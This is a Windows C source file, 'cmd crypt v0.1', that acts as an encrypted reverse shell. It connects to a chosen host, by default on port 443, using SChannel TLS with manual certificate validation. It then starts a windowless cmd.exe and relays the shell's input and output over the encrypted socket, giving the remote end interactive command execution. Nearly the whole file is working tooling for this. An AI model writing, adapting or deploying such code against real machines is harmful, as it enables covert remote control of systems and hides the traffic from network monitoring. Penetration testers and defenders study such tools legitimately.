/**
 * Copyright 2015 Odzhan
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, 
 * MA  02111-1307 USA
 * 
 * http://www.gnu.org/licenses/gpl-2.0.txt
 * 
 */

#define SECURITY_WIN32

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>
#include <shlwapi.h>

#include <wintrust.h>
#include <schannel.h>
#include <security.h>
#include <sspi.h>

#pragma comment(lib, "WS2_32.Lib")
#pragma comment(lib, "Crypt32.Lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shlwapi.lib")

PBYTE                  pbIoBuffer;
DWORD                  cbIoBufferLength;
SCHANNEL_CRED          SchannelCred;
PSecurityFunctionTable sspi;
SECURITY_STATUS        ss;
TimeStamp              ts;

PBYTE pbData;
DWORD cbData;

CredHandle hClientCreds;
CtxtHandle hContext;

struct sockaddr_in sin;
struct hostent     *hp;
WSADATA            wsa;

#define RSA_KEY_XCHG 1
#define DHE_KEY_XCHG 2

#define DEFAULT_PORT "443"

#define SERVER_MODE 0
#define CLIENT_MODE 1

typedef struct _CMD_ARGS {
  int    xchg_type;       // key exchange type
  DWORD  xchg_len;        // key exchange length
  int    enc_nbr;         // encryption index as integer
  ALG_ID enc_id;          //
  char   *port;           // port number as string
  int    port_nbr;        // port number as integer
  char   *address;        // local or remote address as IP or host name
  int    mode;            // server or client mode
  int    secure;          // security is enabled by default but can be switched off with -s
  int    ai_family;       // AF_INET or AF_INET6
  int    list_prov;
} CMD_ARGS;

DWORD       dwProtocol = SP_PROT_TLS1; // SP_PROT_TLS1; // SP_PROT_PCT1; SP_PROT_SSL2; SP_PROT_SSL3; 0=default
ALG_ID      aiKeyExch  = 0; // = default; CALG_DH_EPHEM; CALG_RSA_KEYX;
CredHandle  hClientCreds;
LPSTR       pszUser;
LPSTR       pszServer;
LPSTR       pszPort;

SecPkgContext_StreamSizes Sizes;

HANDLE      evt[MAXIMUM_WAIT_OBJECTS];
DWORD       len, publen, evt_cnt=0, sck_evt, ctrl_evt, stdin_evt, stdout_evt, proc_evt, last_pkt_err;
SOCKET      s, r;
BYTE        ip[64];

CMD_ARGS    args;

struct sockaddr_in sin_ipv4;
struct sockaddr_in6 sin_ipv6;

int ai_addrlen;
struct sockaddr *ai_addr;

// display windows error message
void xstrerror (const char fmt[], ...) 
{
  char    *error;
  va_list arglist;
  char    buffer[2048];
  
  va_start (arglist, fmt);
  wvnsprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
  va_end (arglist);
  
  FormatMessage (
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
      NULL, GetLastError (), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
      (LPSTR)&error, 0, NULL);

  printf ("  [ %s : %s\n", buffer, error);
  LocalFree (error);
}

SECURITY_STATUS chs_hello (void)
{
  DWORD         dwFlagsIn, dwFlagsOut;
  SecBuffer     sb[1];
  SecBufferDesc hs;
  
  dwFlagsIn = ISC_REQ_SEQUENCE_DETECT | 
              ISC_REQ_REPLAY_DETECT   | 
              ISC_REQ_CONFIDENTIALITY | 
              ISC_RET_EXTENDED_ERROR  | 
              ISC_REQ_ALLOCATE_MEMORY | 
              ISC_REQ_STREAM;

  //  Initiate a ClientHello message and generate a token.
  sb[0].pvBuffer   = NULL;
  sb[0].BufferType = SECBUFFER_TOKEN;
  sb[0].cbBuffer   = 0;

  hs.cBuffers      = 1;
  hs.pBuffers      = sb;
  hs.ulVersion     = SECBUFFER_VERSION;

  ss = sspi->InitializeSecurityContextA (&hClientCreds, NULL, pszServer, dwFlagsIn, 
              0, SECURITY_NATIVE_DREP, NULL, 0, &hContext, &hs, &dwFlagsOut, &ts);

  if (ss!=SEC_I_CONTINUE_NEEDED) {
    return ss;
  }
  if (sb[0].cbBuffer != 0) {
    send (s, sb[0].pvBuffer, sb[0].cbBuffer, 0);
    ss = sspi->FreeContextBuffer (sb[0].pvBuffer);
  }
  return ss;
}

SECURITY_STATUS chs (void)
{
  DWORD         dwFlagsIn, dwFlagsOut;
  SecBuffer     ib[2], ob[1];
  SecBufferDesc in, out;
  DWORD         cbIoBuffer=0;
  PBYTE         IoBuffer;
  int           len;
  BOOL          bRead=TRUE;
  
  IoBuffer = LocalAlloc (LMEM_FIXED, 8192);
  
  if ((ss=chs_hello())!=SEC_E_OK) {
    return ss;
  }
  
  dwFlagsIn = ISC_REQ_SEQUENCE_DETECT | 
              ISC_REQ_REPLAY_DETECT   | 
              ISC_REQ_CONFIDENTIALITY |
              ISC_RET_EXTENDED_ERROR  | 
              ISC_REQ_ALLOCATE_MEMORY | 
              ISC_REQ_STREAM;

  ss=SEC_I_CONTINUE_NEEDED;
  
  while (ss==SEC_I_CONTINUE_NEEDED || ss==SEC_E_INCOMPLETE_MESSAGE)
  {
    if (ss==SEC_E_INCOMPLETE_MESSAGE || cbIoBuffer==0)
    {
      if (bRead)
      {
        len=recv (s, &IoBuffer[cbIoBuffer], 8192, 0);
      
        if (len<=0) {
          break;
        }
        cbIoBuffer += len;
      } else {
        bRead=TRUE;
      }
    }
    
    ib[0].pvBuffer   = IoBuffer;
    ib[0].cbBuffer   = cbIoBuffer;
    ib[0].BufferType = SECBUFFER_TOKEN;

    ib[1].pvBuffer   = NULL;
    ib[1].cbBuffer   = 0;
    ib[1].BufferType = SECBUFFER_EMPTY;

    in.cBuffers      = 2;
    in.pBuffers      = ib;
    in.ulVersion     = SECBUFFER_VERSION;

    ob[0].pvBuffer   = NULL;
    ob[0].BufferType = SECBUFFER_TOKEN;
    ob[0].cbBuffer   = 0;

    out.cBuffers     = 1;
    out.pBuffers     = ob;
    out.ulVersion    = SECBUFFER_VERSION;

    ss = sspi->InitializeSecurityContextA (&hClientCreds, &hContext, 
      NULL, dwFlagsIn, 0, SECURITY_NATIVE_DREP, &in, 0, NULL, 
      &out, &dwFlagsOut, &ts);
    
    if (ss==SEC_E_ILLEGAL_MESSAGE) {
      ss=SEC_I_CONTINUE_NEEDED;
      cbIoBuffer=0;
      continue;
    }
    
    if (ss==SEC_E_OK || 
        ss==SEC_I_CONTINUE_NEEDED ||
        FAILED (ss) && (dwFlagsOut & ISC_RET_EXTENDED_ERROR))
    {
      if (ob[0].cbBuffer != 0) {
        len=send (s, ob[0].pvBuffer, ob[0].cbBuffer, 0);
      
        if (len<=0) {
          break;
        }
      
        sspi->FreeContextBuffer (ob[0].pvBuffer);
      }
    }
    if (ss==SEC_E_INCOMPLETE_MESSAGE) continue;
    if (ss==SEC_E_OK) {
      if (ib[1].BufferType==SECBUFFER_EXTRA) {
        printf ("\n extra data available");
      }
      break;
    }      
    // Copy any leftover data from the "extra" buffer, and go around again.
    if ( ib[1].BufferType == SECBUFFER_EXTRA )
    {
      MoveMemory (IoBuffer, &IoBuffer[cbIoBuffer - ib[1].cbBuffer], ib[1].cbBuffer);
      cbIoBuffer = ib[1].cbBuffer;
    }
    else
    cbIoBuffer = 0;
  }
  LocalFree (IoBuffer);
  return ss;
}

// create credentials
// connect to server
// perform client handshake
// run cmd
// disconnect from server
// 

// convert binary network address to string
char *addr2ip (void)
{
  DWORD ip_size=64;
  WSAAddressToString (ai_addr, ai_addrlen, NULL, (char*)ip, &ip_size);
  return (char*)ip;
}

/**
 *
 * sets the width of console buffer
 *
 */
VOID setw (SHORT X) {
  CONSOLE_SCREEN_BUFFER_INFO csbi;
  GetConsoleScreenBufferInfo (GetStdHandle(STD_OUTPUT_HANDLE), &csbi);
  
  if (X <= csbi.dwSize.X) return;
  csbi.dwSize.X = X;
  SetConsoleScreenBufferSize (GetStdHandle(STD_OUTPUT_HANDLE), csbi.dwSize);
}

/**
 *
 * Resolve host, create socket and event handle associated with it
 *
 */ 
BOOL open_tcp (void)
{
  struct addrinfo *list, *e;
  struct addrinfo hints;
  BOOL            bStatus=FALSE;
  WSADATA         wsa;
  int             on=1;
  
  WSAStartup (MAKEWORD (2, 0), &wsa);
  
  ZeroMemory (&hints, sizeof (hints));

  hints.ai_family   = args.ai_family;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  
  // get all resolvable addresses for this machine name
  if (getaddrinfo (args.address, args.port, &hints, &list) == 0) 
  {
    for (e=list; e!=NULL; e=e->ai_next) 
    {
      if (args.ai_family==AF_INET) {
        memcpy (&sin_ipv4, e->ai_addr, e->ai_addrlen);
        ai_addr     = (SOCKADDR*)&sin_ipv4;        
      } else {
        memcpy (&sin_ipv6, e->ai_addr, e->ai_addrlen);
        ai_addr     = (SOCKADDR*)&sin_ipv6;
      }
      ai_addrlen = e->ai_addrlen;
      // create socket
      s=socket (args.ai_family, SOCK_STREAM, IPPROTO_TCP);
      evt[sck_evt = evt_cnt++] = WSACreateEvent();
      if (s!=SOCKET_ERROR) {
        // ensure we can reuse same port later
        setsockopt (s, SOL_SOCKET, SO_REUSEADDR, (char*)&on, sizeof (on));
        bStatus=TRUE;
      }
      break;
    }
    freeaddrinfo (list);
  } else {
    xstrerror ("getaddrinfo(%s)", args.address);
  }
  return bStatus;
}

/**
 *
 * shut down socket, close event handle, clean up
 *
 */ 
void close_tcp (void)
{
  // disable send/receive operations
  shutdown (s, SD_BOTH);
  // close socket
  closesocket (s);
  // clean up
  WSACleanup();
}

char* getparam (int argc, char *argv[], int *i)
{
  int n=*i;
  if (argv[n][2] != 0) {
    return &argv[n][2];
  }
  if ((n+1) < argc) {
    *i=n+1;
    return argv[n+1];
  }
  printf ("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
  exit (0);
}

void usage (void) 
{ 
  int i;
  
  printf ("\n  usage: cms <address> [options]\n");
  printf ("\n  -6           Use IP version 6");
  printf ("\n  -p <number>  Port number to use (default is 443)");
  printf ("\n  -x <number>  Key Exchange : 1=RSA (default), 2=DHE");
  printf ("\n\n  Press any key to continue . . .");
  getchar ();
  exit (0);
}

// parse the arguments on command line
void parse_args (int argc, char *argv[])
{
  int  i;
  char opt;
  
  // for each argument
  for (i=1; i<argc; i++)
  {
    // is this option?
    if (argv[i][0]=='-' || argv[i][1]=='/')
    {
      // get option value
      opt=argv[i][1];
      switch (opt)
      {
        case 'a':
          args.list_prov=1;
          break;
        case '4':
          args.ai_family=AF_INET;
          break;
        case '6':     // use ipv6 (default is ipv4)
          args.ai_family=AF_INET6;
          break;
        case 'l':     // list provider types and algorithms
          args.mode=SERVER_MODE;
          break;
        case 'p':     // port number
          args.port=getparam(argc, argv, &i);
          args.port_nbr=atoi(args.port);
          break;
        case 'x':     // key exchange type
          args.xchg_type=atoi(getparam(argc, argv, &i));
          break;
        case 'k':     // key exchange length 
          args.xchg_len=atoi(getparam(argc, argv, &i));
          args.xchg_len=args.xchg_len==1 ? 1024 : 2048;
          break;
        case 'e':     // encryption index
          args.enc_nbr=atoi(getparam(argc,  argv, &i));
          break;
        case 's':     // no encryption (on by default)
          args.secure=0;
          break;
        case '?':     // display usage
        case 'h':
          usage ();
          break;
        default:
          printf ("  [ unknown option %c\n", opt);
          break;
      }
    } else {
      // assume it's hostname or ip
      args.address=argv[i];
    }
  }
}

int validate_args (void)
{
  // validate selected key exchange
  if (args.xchg_type!=RSA_KEY_XCHG && args.xchg_type!=DHE_KEY_XCHG) {
    printf ("  [ Valid key exchange values are %i (RSA) and %i (DHE)\n",
      RSA_KEY_XCHG, DHE_KEY_XCHG);
    return 0;
  }
  
  // validate port
  // port numbers should be 0 > port < 65535
  if (!(args.port_nbr>=1 && args.port_nbr<=65535)) {
    printf ("  [ Invalid port, choose from 1-65535\n");
    return 0;
  }
  
  // validate key length
  if (args.xchg_len!=1024 && args.xchg_len!=2048) {
    printf ("  [ Invalid key length specified, choose 1 (1024) or 2 (2048)\n");
    return 0;
  }
  
  // server or client mode?
  if (args.mode==CLIENT_MODE && args.address==NULL) {
    printf ("  [ No host specified\n");
    return 0;
  }
  return 1;
}

void display_args (void)
{
  printf ("  [ %s mode using IPv%i\n", 
    args.mode==SERVER_MODE ? "Server" : "Client",
    args.ai_family==AF_INET ? 4:6);
    
  printf ("  [ %s-%i key exchange\n", 
    args.xchg_type==RSA_KEY_XCHG?"RSA":"DHE", 
    args.xchg_len);
    
  printf ("  [ Address is %s\n", addr2ip());
}

BOOL WINAPI HandlerRoutine (DWORD dwCtrlType)
{
  if (dwCtrlType != CTRL_C_EVENT) return FALSE;
  SetEvent (evt[ctrl_evt]);
  return TRUE;
}

// create handler for CTRL+C event
void start_handler (void)
{
  evt[ctrl_evt = evt_cnt++] = CreateEvent (NULL, FALSE, FALSE, NULL);
  SetConsoleCtrlHandler (HandlerRoutine, TRUE);
}

// remove handler for CTRL+C
void stop_handler (void)
{
  SetConsoleCtrlHandler (HandlerRoutine, FALSE);
  CloseHandle (evt[ctrl_evt]);
  evt_cnt--;
}

SECURITY_STATUS ssl_send (void)
{
  SecBufferDesc  msg;
  SecBuffer      sb[4];
  
  // stream header
  sb[0].pvBuffer   = pbIoBuffer; 
  sb[0].cbBuffer   = Sizes.cbHeader; 
  sb[0].BufferType = SECBUFFER_STREAM_HEADER;

  // stream data
  sb[1].pvBuffer   = pbIoBuffer + Sizes.cbHeader;
  sb[1].cbBuffer   = cbData; 
  sb[1].BufferType = SECBUFFER_DATA; 
  
  // stream trailer
  sb[2].pvBuffer   = pbIoBuffer + Sizes.cbHeader + cbData; 
  sb[2].cbBuffer   = Sizes.cbTrailer; 
  sb[2].BufferType = SECBUFFER_STREAM_TRAILER; 

  sb[3].pvBuffer   = SECBUFFER_EMPTY; 
  sb[3].cbBuffer   = SECBUFFER_EMPTY; 
  sb[3].BufferType = SECBUFFER_EMPTY;

  msg.ulVersion    = SECBUFFER_VERSION; 
  msg.cBuffers     = 4;
  msg.pBuffers     = sb; 
  
  ss = sspi->EncryptMessage (&hContext, 0, &msg, 0);
  
  send (s, pbIoBuffer, sb[0].cbBuffer + sb[1].cbBuffer + sb[2].cbBuffer, 0);
  return ss;
}

SECURITY_STATUS ssl_recv (void)
{
  SecBufferDesc  msg;
  SecBuffer      sb[4];
  DWORD          cbIoBuffer=0;
  SecBuffer      *pData=NULL, *pExtra=NULL;
  int            len, i;
  ss=SEC_E_INCOMPLETE_MESSAGE;
  
  do
  {
    if (cbIoBuffer==0 || ss==SEC_E_INCOMPLETE_MESSAGE)
    {
      len = recv (s, pbData + cbIoBuffer, BUFSIZ, 0);
      if (len<=0) break;
      
      cbIoBuffer += len;
      
      sb[0].pvBuffer   = pbData;
      sb[0].cbBuffer   = cbIoBuffer;
    
      sb[0].BufferType = SECBUFFER_DATA;
      sb[1].BufferType = SECBUFFER_EMPTY;
      sb[2].BufferType = SECBUFFER_EMPTY;
      sb[3].BufferType = SECBUFFER_EMPTY;

      msg.ulVersion    = SECBUFFER_VERSION;
      msg.cBuffers     = 4;
      msg.pBuffers     = sb;
    
      ss = sspi->DecryptMessage (&hContext, &msg, 0, NULL);
    
      if (ss == SEC_I_CONTEXT_EXPIRED) break;
    
      for (i=0; i<4; i++) {
        if (pData==NULL && sb[i].BufferType==SECBUFFER_DATA) pData=&sb[i];
        if (pExtra==NULL && sb[i].BufferType==SECBUFFER_EXTRA) pExtra=&sb[i];
      }
      
      if (pData!=NULL)
      {
        cbData=pData->cbBuffer;
        if (cbData!=0)
        {
          memcpy (pbData, pData->pvBuffer, cbData);
          break;
        }
      }
    }
  } while (1);
  return SEC_E_OK;
}

// create credentials
SECURITY_STATUS create_creds (void)   
{
  DWORD  cSupportedAlgs = 0;
  ALG_ID rgbSupportedAlgs[16];
  
  ZeroMemory (&SchannelCred, sizeof (SchannelCred));

  SchannelCred.dwVersion             = SCHANNEL_CRED_VERSION;
  SchannelCred.grbitEnabledProtocols = SP_PROT_SSL3 | SP_PROT_TLS1;

  if (aiKeyExch) { 
    rgbSupportedAlgs[cSupportedAlgs++] = aiKeyExch;
  }
  
  if (cSupportedAlgs) {
    SchannelCred.cSupportedAlgs    = cSupportedAlgs;
    SchannelCred.palgSupportedAlgs = rgbSupportedAlgs;
  }

  SchannelCred.dwFlags |= SCH_CRED_NO_DEFAULT_CREDS;
  // We need manual validation
  SchannelCred.dwFlags |= SCH_CRED_MANUAL_CRED_VALIDATION;
  
  ss = sspi->AcquireCredentialsHandleA (NULL, UNISP_NAME_A, 
            SECPKG_CRED_OUTBOUND, NULL, &SchannelCred, NULL, 
            NULL, &hClientCreds, &ts);
  return ss;
}

void secure_info (void)
{
  SecPkgContext_ConnectionInfo ConnectionInfo;

  ss = sspi->QueryContextAttributes (&hContext, SECPKG_ATTR_CONNECTION_INFO, (PVOID)&ConnectionInfo);
  if(ss != SEC_E_OK) { printf("Error 0x%x querying connection info\n", ss); return; }

  printf("\n");

  switch(ConnectionInfo.dwProtocol)
  {
  case SP_PROT_TLS1_CLIENT:
    printf("Protocol: TLS1\n");
    break;

  case SP_PROT_SSL3_CLIENT:
    printf("Protocol: SSL3\n");
    break;

  case SP_PROT_PCT1_CLIENT:
    printf("Protocol: PCT\n");
    break;

  case SP_PROT_SSL2_CLIENT:
    printf("Protocol: SSL2\n");
    break;

  default:
    printf("Protocol: 0x%x\n", ConnectionInfo.dwProtocol);
  }

  switch(ConnectionInfo.aiCipher)
  {
  case CALG_RC4:
    printf("Cipher: RC4\n");
    break;

  case CALG_3DES:
    printf("Cipher: Triple DES\n");
    break;

  case CALG_RC2:
    printf("Cipher: RC2\n");
    break;

  case CALG_DES:
  case CALG_CYLINK_MEK:
    printf("Cipher: DES\n");
    break;

  case CALG_SKIPJACK:
    printf("Cipher: Skipjack\n");
    break;
  case CALG_AES_128:
  case CALG_AES_192:
  case CALG_AES_256:
    printf ("Cipher: AES\n");
    break;
  default:
    printf("Cipher: 0x%x\n", ConnectionInfo.aiCipher);
  }

  printf("Cipher strength: %d\n", ConnectionInfo.dwCipherStrength);

  switch(ConnectionInfo.aiHash)
  {
  case CALG_MD5:
    printf("Hash: MD5\n");
    break;

  case CALG_SHA:
    printf("Hash: SHA\n");
    break;

  default:
    printf("Hash: 0x%x\n", ConnectionInfo.aiHash);
  }

  printf("Hash strength: %d\n", ConnectionInfo.dwHashStrength);

  switch(ConnectionInfo.aiExch)
  {
  case CALG_RSA_KEYX:
  case CALG_RSA_SIGN:
    printf("Key exchange: RSA\n");
    break;

  case CALG_KEA_KEYX:
    printf("Key exchange: KEA\n");
    break;

  case CALG_DH_SF:
    printf ("DHSF");
    break;
  case CALG_DH_EPHEM:
    printf("Key exchange: DH Ephemeral\n");
    break;
    
  case CALG_ECDH:
    printf ("Key exchange: ECDH\n");
    break;
  
  case CALG_ECMQV:
    printf ("Key exchange: ECMQV\n");
    break;
    
  default:
    printf("Key exchange: 0x%x\n",
    ConnectionInfo.aiExch);
  }

  printf("Key exchange strength: %d\n", ConnectionInfo.dwExchStrength);
}

DWORD wait_evt (void)
{
  WSANETWORKEVENTS ne;
  u_long           off=0;
  DWORD            e;
  
  WSAEventSelect (s, evt[sck_evt], FD_CLOSE | FD_READ | FD_ACCEPT);
  e=WaitForMultipleObjects (evt_cnt, evt, FALSE, INFINITE);

  WSAEnumNetworkEvents (s, evt[sck_evt], &ne);    
  WSAEventSelect (s, evt[sck_evt], 0);
  
  ioctlsocket (s, FIONBIO, &off);
  
  if (ne.lNetworkEvents & FD_CLOSE) {
    e=-1;
  }
  return e;
}

void cmd (void) 
{
  SECURITY_ATTRIBUTES sa;
  PROCESS_INFORMATION pi;
  STARTUPINFO         si;
  OVERLAPPED          lap;
  
  HANDLE              lh[4];
  DWORD               p, e;
  
  sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle       = TRUE;
  
  evt[stdout_evt = evt_cnt++] = CreateEvent (NULL, TRUE, TRUE, NULL);
  
  if (CreatePipe (&lh[0], &lh[1], &sa, 0)) 
  {  
    lh[2] = CreateNamedPipe ("\\\\.\\pipe\\0", 
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE     | PIPE_READMODE_BYTE | PIPE_WAIT, 
        PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);
        
    if (lh[2] != INVALID_HANDLE_VALUE) 
    {  
      lh[3] = CreateFile ("\\\\.\\pipe\\0", MAXIMUM_ALLOWED, 
          0, &sa, OPEN_EXISTING, 0, NULL);
      
      if (lh[3] != INVALID_HANDLE_VALUE) 
      {
        ZeroMemory (&si, sizeof (si));
        ZeroMemory (&pi, sizeof (pi));

        si.cb              = sizeof (si);
        si.hStdInput       = lh[0];
        si.hStdError       = lh[3];
        si.hStdOutput      = lh[3];
        si.dwFlags         = STARTF_USESTDHANDLES;
        
        if (CreateProcess (NULL, "cmd", NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) 
        {
          evt[proc_evt = evt_cnt++] = pi.hProcess;
          
          ZeroMemory (&lap, sizeof (lap));       
          lap.hEvent = evt[stdout_evt];
          
          p=0;
          
          do 
          {
            e=wait_evt();

            if (e==ctrl_evt) {
              printf ("  [ CTRL+C received\n");
              break;
            }
            if (e==proc_evt) {
              printf ("  [ cmd.exe terminated\n");
              break;
            }
            
            if (e == -1) break;

            // is this socket event?
            if (e == sck_evt) 
            {
              if (ssl_recv () != SEC_E_OK) 
                break;
              
              WriteFile (lh[1], pbData, cbData, &cbData, 0);
              p--;  // we're ready to read again.              
            } else
           
            // data from cmd.exe?
            if (e == stdout_evt) 
            {
              if (p == 0)  // still waiting for previous read to complete?
              {
                ReadFile (lh[2], pbData, BUFSIZ, &cbData, &lap);
                p++;
              } else {
                if (!GetOverlappedResult (lh[2], &lap, &cbData, FALSE)) {
                  break;
                }
              }
              if (cbData != 0)
              {
                if (ssl_send() != SEC_E_OK) 
                  break;
                p--;
              }
            }
          } while (1);
          TerminateProcess (pi.hProcess, 0);
          
          CloseHandle (pi.hThread);
          CloseHandle (pi.hProcess);
          evt_cnt--;
        }
        CloseHandle (lh[3]);
      }
      CloseHandle (lh[2]);
    }
    CloseHandle (lh[1]);
    CloseHandle (lh[0]);
  }
  CloseHandle (evt[stdout_evt]);
  evt_cnt--;
}


int main (int argc, char *argv[])
{
  INIT_SECURITY_INTERFACE pInitSecurityInterface;
  
  // set buffer width of console
  setw (300);
  
  puts ("\n  [ cmd crypt v0.1 - Copyleft 2015 (x) @Odzhan\n");
  
  // set up default values
  args.mode      = CLIENT_MODE;
  args.xchg_type = RSA_KEY_XCHG;
  args.xchg_len  = 1024;
  args.address   = NULL;
  args.ai_family = AF_INET;
  args.port      = DEFAULT_PORT;
  args.port_nbr  = atoi(args.port);
  args.enc_nbr   = 7;   // AES-256
  args.enc_id    = CALG_AES_256;
  
  pInitSecurityInterface = (INIT_SECURITY_INTERFACE)GetProcAddress(LoadLibrary("Secur32"), "InitSecurityInterfaceA" );
  if (pInitSecurityInterface==NULL) printf ("didn't resolve");
  sspi = pInitSecurityInterface();
  
  // process command line
  parse_args(argc, argv);

  // validate options provided
  if (validate_args ()) {
    // resolve address and open socket
    if (open_tcp ()) {
      display_args();
      start_handler ();
      
      // create credentials
      if (create_creds()==SEC_E_OK)
      {
        // connect to server
        if (connect (s, ai_addr, ai_addrlen) != SOCKET_ERROR) {
          // perform the handshake
          if (chs () == SEC_E_OK) {
            // send something
            secure_info();
            ss=sspi->QueryContextAttributes (&hContext, SECPKG_ATTR_STREAM_SIZES, &Sizes );
            cbIoBufferLength = Sizes.cbHeader  +  Sizes.cbMaximumMessage  +  Sizes.cbTrailer;
            pbIoBuffer       = LocalAlloc(LMEM_FIXED, cbIoBufferLength);
            pbData=pbIoBuffer + Sizes.cbHeader;
            
            cmd();
            
          } else {
            printf ("  [ handshake failed\n");
          }
        } else {
          printf ("  [ unable to connect\n");
        }
      } else {
        printf ("  [ error creating credentials\n");
      }
      stop_handler ();
      close_tcp();
    }
  }
  return 0;
}

